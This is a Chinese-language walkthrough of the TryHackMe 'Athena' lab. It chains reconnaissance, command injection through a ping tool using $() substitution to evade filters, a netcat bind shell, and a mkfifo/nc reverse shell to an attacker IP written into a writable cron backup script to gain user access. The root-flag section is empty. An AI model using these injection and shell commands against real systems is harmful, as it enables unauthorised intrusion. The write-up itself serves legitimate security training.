# Athena

> 🚩 **Athena** — TryHackMe
> 
> [👉 点击进入靶场房间](https://tryhackme.com/room/4th3n4)
> 
---

### 1. 信息收集 (Recon)
执行端口扫描：
```bash
nmap -sC -sV 10.10.x.x
```
用Nmap扫描目标时，我们可以发现有四个开放端口，每个端口运行不同的服务。端口22为SSH，端口为80，在139/445端口为SMB

![扫描结果](./assets/Athena_01.png)

执行目录爆破工具:
```bash
gobuster dir -u 10.48.155.161 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
好像没有我们想要的目录

![扫描结果](./assets/Athena_02.png)

访问网站时，我们只看到一个静态页面，没有可用的链接。

![扫描结果](./assets/Athena_03.png)

查看源代码，并没有什么值得关注

![扫描结果](./assets/Athena_04.png)

查看共享目录

![扫描结果](./assets/Athena_05.png)

将目录里的文件下载到本地，我们看到管理员的消息，它定向目录是 /myrouterpanel

![扫描结果](./assets/Athena_06.png)

我们看到的是一个正在开发中的页面，一个用服务器ping其他设备的工具

![扫描结果](./assets/Athena_07.png)

### 2.user falg

通过提供有效的IP地址，比如localhost，我们就能得到ping的结果。

![扫描结果](./assets/Athena_09.png)

结果会在新页面上展示。

![扫描结果](./assets/Athena_08.png)

通过尝试用 ，将命令串联，否则我们会得到消息。所以简单的命令链像反向壳一样注入有效载荷在这里是行不通的。`&` `|` `;` `"Attempt hacking!"`

![扫描结果](./assets/Athena_10.png)
![扫描结果](./assets/Athena_11.png)

另一种注入命令的方法是使用命令替换。
> [👉 指令代替](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)

在命令替换中，它捕获一个命令的输出，并将其作为输入传递，或在另一个命令中使用。命令替换可以通过在你的命令中使用来完成。所以当命令行被解析时，里面的所有内容都会先被执行，结果会被传递。`$(your_command)` `$()`

例如，在命令行中：
```bash
cat $(cat test) 
```
![扫描结果](./assets/Athena_12.png)

我们执行了，五秒后才得到结果。
![扫描结果](./assets/Athena_13.png)

我们现在可以注入命令，但至少字符是被过滤的 `|` `&` `;`。

大多数反向shell都包含这些字符，而URL编码和双重URL编码在这种情况下并不起作用。

所以，我们用一个简单的绑定壳试试:
> [👉 在Linux上即使没有nc也能方向shell](https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/)

```bash
nc -lp 4445 -e /bin/bash
```
![扫描结果](./assets/Athena_14.png)
![扫描结果](./assets/Athena_15.png)

为了方便，我们要升级外壳。
> [👉 将简单壳升级为完全交互式的TTY](https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/)

```bash
SHELL=/bin/bash script -q /dev/null
```

```bash
stty raw -echo && fg
```
![扫描结果](./assets/Athena_16.png)

接下来打开新的终端，启动Python网络服务器，为目标用户提供有用的枚举工具。
```bash
python3 -m http.server 9000
```
在这种情况下，我们使用了 `linpeas.sh` 和 `pspy64`

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```
在交互壳里下载工具

![扫描结果](./assets/Athena_17.png)

我们没能找到关于Linpeas的有趣内容。但会显示用户有定期运行某些任务（比如 cronjob），由用户用 UID 1001 执行。它是一个备份脚本，位于 `pspy64` `/usr/share/backup/backup.sh`

![扫描结果](./assets/Athena_18.png)

通过检查文件，我们发现它是用户 `athena`
![扫描结果](./assets/Athena_19.png)

通过查看发现用户可以写入
![扫描结果](./assets/Athena_20.png)

由于我们升级了壳子，可以进行`vi`编辑写入：
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.48.93.133 4446 >/tmp/f
```
![扫描结果](./assets/Athena_21.png)

短时间后，反向 shell 连接，我们成为根目录中的 `athena` 用户。接着，我们再次升级外壳。
![扫描结果](./assets/Athena_22.png)

查找发现flag位于 ***/home/athena/user.txt***里面

### 3.root flag